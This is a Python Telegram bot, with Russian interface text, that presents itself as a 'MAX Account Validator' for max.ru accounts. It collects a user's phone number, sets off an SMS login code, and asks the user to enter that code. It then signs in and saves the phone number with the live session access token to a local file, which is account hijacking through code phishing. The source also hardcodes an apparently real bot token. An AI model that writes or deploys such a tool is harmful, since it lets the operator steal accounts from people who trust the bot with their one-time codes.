import asyncio
import telebot
import logging

# ============ ВСТАВЬ СВОЙ ТОКЕН СЮДА ============
BOT_TOKEN = "8407984730:AAGVNP8TWRP7AcsrWk5xod0z8qbsW7qt3lE"
# =================================================

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

user_states = {}

MAX_REQUEST_CODE_URL = "https://max.ru/api/auth/request_code"
MAX_CONFIRM_CODE_URL = "https://max.ru/api/auth/confirm_code"
MAX_CHECK_SESSION_URL = "https://max.ru/api/auth/check_session"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://max.ru",
    "Referer": "https://max.ru/auth/login"
}

def request_sms_code(phone):
    try:
        resp = __import__('requests').post(MAX_REQUEST_CODE_URL, headers=HEADERS, json={"phone": phone, "type": "login"}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("success"):
            return True, data.get("session_id", ""), "Код отправлен на номер"
        elif resp.status_code == 429:
            return False, None, "Слишком много запросов. Подождите минуту."
        elif "not found" in str(data).lower():
            return False, None, "Аккаунт с таким номером не найден"
        elif "blocked" in str(data).lower():
            return False, None, "Аккаунт заблокирован"
        else:
            return False, None, f"Ошибка MAX: {data}"
    except Exception as e:
        return False, None, f"Ошибка соединения: {e}"

def confirm_code(phone, code, session_id):
    try:
        resp = __import__('requests').post(MAX_CONFIRM_CODE_URL, headers=HEADERS, json={"phone": phone, "code": code, "session_id": session_id}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("access_token"):
            return True, data.get("access_token"), "Вход выполнен успешно"
        elif "invalid" in str(data).lower():
            return False, None, "Неверный код. Попробуйте ещё раз."
        elif "expired" in str(data).lower():
            return False, None, "Код истёк. Запросите новый."
        else:
            return False, None, f"Ошибка подтверждения: {data}"
    except Exception as e:
        return False, None, f"Ошибка соединения: {e}"

def check_session_valid(access_token):
    try:
        resp = __import__('requests').get(MAX_CHECK_SESSION_URL, headers={**HEADERS, "Authorization": f"Bearer {access_token}"}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("valid"):
            user_info = data.get("user", {})
            return True, f"ID: {user_info.get('id', 'N/A')}\nИмя: {user_info.get('name', 'N/A')}"
        else:
            return False, "Сессия недействительна"
    except Exception as e:
        return False, f"Ошибка проверки: {e}"

@bot.message_handler(commands=['start'])
def start(message):
    user_states[message.chat.id] = {"state": "waiting_phone"}
    bot.reply_to(message, "🔐 **MAX Account Validator**\n\n📱 Введите номер телефона:\n`+7XXXXXXXXXX`", parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    state = user_states.get(chat_id, {}).get("state")

    if state == "waiting_phone":
        phone = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not phone.startswith("+"):
            phone = "+7" + phone.lstrip("87")
        bot.reply_to(message, f"📱 Проверяю номер `{phone}`...", parse_mode="Markdown")
        success, session_id, msg = request_sms_code(phone)
        if success:
            user_states[chat_id] = {"state": "waiting_code", "phone": phone, "session_id": session_id}
            bot.reply_to(message, f"✅ {msg}\n\n📩 Введите 6-значный код из SMS:")
        else:
            bot.reply_to(message, f"❌ {msg}")

    elif state == "waiting_code":
        code = text.strip()
        if not code.isdigit() or len(code) != 6:
            bot.reply_to(message, "Код должен состоять из 6 цифр.")
            return
        phone = user_states[chat_id]["phone"]
        session_id = user_states[chat_id]["session_id"]
        bot.reply_to(message, "🔐 Выполняю вход...")
        success, access_token, msg = confirm_code(phone, code, session_id)
        if success:
            valid, info = check_session_valid(access_token)
            if valid:
                bot.reply_to(message, f"🟢 **АККАУНТ ЖИВОЙ!**\n\n```\n{info}\n```", parse_mode="Markdown")
                with open("valid_accounts.txt", "a") as f:
                    f.write(f"{phone} | {access_token} | {info}\n")
            else:
                bot.reply_to(message, f"🔴 {info}")
            user_states.pop(chat_id, None)
        else:
            bot.reply_to(message, f"❌ {msg}")

if __name__ == "__main__":
    print("🤖 MAX Validator запущен...")
    bot.infinity_polling()